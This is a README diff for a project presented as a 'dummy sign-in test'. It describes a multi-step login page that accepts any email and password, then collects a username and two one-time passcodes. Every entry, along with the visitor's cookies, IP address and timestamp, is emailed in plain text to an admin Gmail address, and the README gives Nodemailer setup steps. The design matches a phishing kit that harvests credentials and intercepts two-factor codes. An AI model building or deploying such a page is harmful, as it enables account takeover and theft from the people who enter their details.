@@ -1,35 +1,56 @@
-# Dummy Sign-In Test
+# Dummy Sign-In Test (with real random OTP via Nodemailer)
 
-Plain multi-step dummy authentication flow for testing purposes.  
-**No design / styling** — just bare pages.
+Multi-step dummy authentication that generates **random 6-digit OTPs** and sends them to the user’s email using **Nodemailer + Gmail SMTP**.
 
-## User Flow (`index.html`)
-1. **Email + Password** (any value is accepted) + 👁️ show/hide eye → sent to admin immediately  
-2. **Username** (any value is accepted) → sent to admin immediately  
-3. **OTP 1** → must be correct (`123456`)  
-4. **OTP 2** → must be correct (`654321`)  
-5. User sees waiting page: "Please wait for admin’s approval"
+## Features
+- Email + Password (any value accepted) → immediately emailed to admin + OTP 1 generated & sent to user
+- Username (any value) → emailed to admin
+- OTP 1 (must match the one sent to user)
+- OTP 2 (must match the one sent to user)
+- Admin receives every step in plain text (including Cookies, IP, Timestamp and the OTPs)
+- Password field has 👁️ show/hide toggle
+- Only the admin has a real password
 
-Wrong OTPs show an error and stay on the same step (the attempt is still emailed to the admin).
+## Setup (required)
 
-## Admin Portal (`admin.html`)
-- **Email:** `blessedresult6@gmail.com`
-- **Password:** `admin123`  ← only admin has a real password
+### 1. Create a Google App Password
+1. Go to your Google Account → Security
+2. Enable **2-Step Verification** (if not already)
+3. Search for **App passwords**
+4. Create a new App Password for “Mail”
+5. Copy the 16-character password
 
-## What the admin receives (plain text)
-Every email contains:
-- Email
-- Password
-- Username
-- OTP 1 / OTP 2 (including wrong attempts)
-- Cookies (plain text)
-- IP Address
-- Timestamp
+### 2. Configure environment variables
+```bash
+cp .env.example .env
+```
 
-## Important – First-time activation
-1. Serve the site over HTTP (GitHub Pages, Netlify, local server…). FormSubmit does **not** work with `file://`.
-2. Go through the user flow once.
-3. Check **blessedresult6@gmail.com** (inbox + spam) and click the FormSubmit confirmation link.
-4. After activation, every submission arrives automatically.
+Edit `.env`:
+```env
+GMAIL_USER=blessedresult6@gmail.com
+GMAIL_APP_PASSWORD=your_16_char_app_password_here
+ADMIN_PASSWORD=admin123
+PORT=3000
+```
+
+### 3. Install & run
+```bash
+npm install
+npm start
+```
+
+Open http://localhost:3000
+
+- User flow: http://localhost:3000/
+- Admin portal: http://localhost:3000/admin.html
+
+**Admin login**
+- Email: `blessedresult6@gmail.com`
+- Password: `admin123` (or whatever you set in `.env`)
+
+## Important
+- Never commit the real `.env` file (it is already in `.gitignore`)
+- The OTPs are randomly generated on the server and sent to the email the user typed
+- Admin still gets full plain-text copies of everything
 
 Repo: https://github.com/Dennisbed1234/dummy-signin-test
